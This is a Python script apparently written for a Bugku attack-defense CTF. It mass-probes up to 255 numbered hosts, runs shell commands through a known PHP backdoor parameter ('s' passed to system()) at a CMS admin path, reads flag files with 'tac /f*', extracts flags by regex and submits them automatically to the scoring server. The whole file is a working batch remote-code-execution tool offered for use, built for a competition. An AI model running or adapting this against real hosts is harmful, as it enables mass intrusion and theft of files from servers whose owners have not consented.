#!/usr/bin/env python3
import argparse
import concurrent.futures
import json
import re
import sys
import time
from datetime import datetime
from pathlib import Path
from urllib.error import HTTPError
from urllib.parse import urlencode
from urllib.request import Request, urlopen


import os
# 提交 token 请通过环境变量 AWD_BUGKU_TOKEN 提供，勿硬编码进仓库
DEFAULT_TOKEN = os.environ.get("AWD_BUGKU_TOKEN", "YOUR_TOKEN_HERE")
DEFAULT_DOMAIN = os.environ.get("AWD_BUGKU_DOMAIN", "pvp0000.example-awd.com")
DEFAULT_PATH = "/cms/cms/include/admin.php"
DEFAULT_CMD = "tac /f*"
SUBMIT_URL = "https://ctf.bugku.com/pvp/submit.html"

FLAG_PATTERNS = [
    re.compile(r"flag\{[^}\r\n]{1,200}\}", re.I),
    re.compile(r"bugku\{[^}\r\n]{1,200}\}", re.I),
    re.compile(r"\b[a-f0-9]{32}\b", re.I),
]


def http_get(url, timeout):
    req = Request(url, headers={"User-Agent": "Bugku-AWD-Helper/1.0"})
    try:
        with urlopen(req, timeout=timeout) as resp:
            body = resp.read()
            text = body.decode("utf-8", "ignore")
            return resp.status, text
    except HTTPError as exc:
        body = exc.read()
        text = body.decode("utf-8", "ignore")
        return exc.code, text


def make_backdoor_url(host, path, cmd):
    query = urlencode({"s": "system(%r);" % cmd})
    return "http://%s%s?%s" % (host, path, query)


def extract_flags(text):
    found = []
    seen = set()
    for pattern in FLAG_PATTERNS:
        for match in pattern.findall(text):
            flag = match.strip()
            if flag and flag not in seen:
                seen.add(flag)
                found.append(flag)
    return found


def probe_target(idx, args):
    host = "192-168-1-%d.%s" % (idx, args.domain)
    url = make_backdoor_url(host, args.path, args.cmd)
    result = {
        "idx": idx,
        "host": host,
        "url": url,
        "ok": False,
        "status": None,
        "flags": [],
        "body": "",
        "error": "",
    }

    try:
        status, text = http_get(url, args.timeout)
        result["status"] = status
        result["body"] = text[: args.save_body_chars]
        result["flags"] = extract_flags(text)
        result["ok"] = status == 200 and bool(result["flags"])
    except Exception as exc:
        result["error"] = repr(exc)

    return result


def submit_flag(flag, token, timeout):
    query = urlencode({"token": token, "flag": flag})
    url = "%s?%s" % (SUBMIT_URL, query)
    status, text = http_get(url, timeout)
    return status, text.strip()


def parse_range(value):
    if "-" in value:
        start, end = value.split("-", 1)
        return range(int(start), int(end) + 1)
    return [int(value)]


def parse_excludes(value):
    excluded = set()
    if not value:
        return excluded
    for part in value.split(","):
        part = part.strip()
        if not part:
            continue
        excluded.update(parse_range(part))
    return excluded


def main():
    parser = argparse.ArgumentParser(
        description="Batch probe Bugku PVP known backdoor, read flags, and submit them."
    )
    parser.add_argument("--domain", default=DEFAULT_DOMAIN, help="domain suffix")
    parser.add_argument("--path", default=DEFAULT_PATH, help="backdoor path")
    parser.add_argument("--cmd", default=DEFAULT_CMD, help="command executed by backdoor")
    parser.add_argument("--token", default=DEFAULT_TOKEN, help="Bugku PVP submit token")
    parser.add_argument("--range", default="1-255", help="target X range, e.g. 1-255 or 243")
    parser.add_argument("--exclude", default="", help="excluded X values/ranges, e.g. 243 or 1-10,243")
    parser.add_argument("--threads", type=int, default=32, help="concurrent workers")
    parser.add_argument("--timeout", type=float, default=4.0, help="HTTP timeout seconds")
    parser.add_argument("--delay", type=float, default=0.1, help="delay between submissions")
    parser.add_argument("--no-submit", action="store_true", help="only probe, do not submit")
    parser.add_argument(
        "--save-body-chars",
        type=int,
        default=1000,
        help="max response chars saved per target",
    )
    parser.add_argument(
        "--out",
        default="bugku_pvp_results.jsonl",
        help="local result log path",
    )
    args = parser.parse_args()

    excluded = parse_excludes(args.exclude)
    targets = [idx for idx in parse_range(args.range) if idx not in excluded]
    submitted = set()
    out_path = Path(args.out)

    print("[*] targets: %d, domain: %s, path: %s" % (len(targets), args.domain, args.path))
    print("[*] command: %s" % args.cmd)
    if args.no_submit:
        print("[*] no-submit mode enabled")

    with out_path.open("a", encoding="utf-8") as log_fp:
        with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
            future_map = {executor.submit(probe_target, idx, args): idx for idx in targets}
            for future in concurrent.futures.as_completed(future_map):
                result = future.result()
                result["time"] = datetime.now().isoformat(timespec="seconds")
                log_fp.write(json.dumps(result, ensure_ascii=False) + "\n")
                log_fp.flush()

                prefix = "[+]" if result["flags"] else "[-]"
                status = result["status"] if result["status"] is not None else "ERR"
                print("%s %s status=%s flags=%s" % (
                    prefix,
                    result["host"],
                    status,
                    ",".join(result["flags"]) or "-",
                ))

                if args.no_submit:
                    continue

                for flag in result["flags"]:
                    if flag in submitted:
                        continue
                    submitted.add(flag)
                    try:
                        submit_status, submit_text = submit_flag(flag, args.token, args.timeout)
                        print("[submit] %s status=%s resp=%s" % (
                            flag,
                            submit_status,
                            submit_text[:200],
                        ))
                    except Exception as exc:
                        print("[submit-error] %s %r" % (flag, exc), file=sys.stderr)
                    time.sleep(args.delay)

    print("[*] done, log saved to %s" % out_path)


if __name__ == "__main__":
    main()
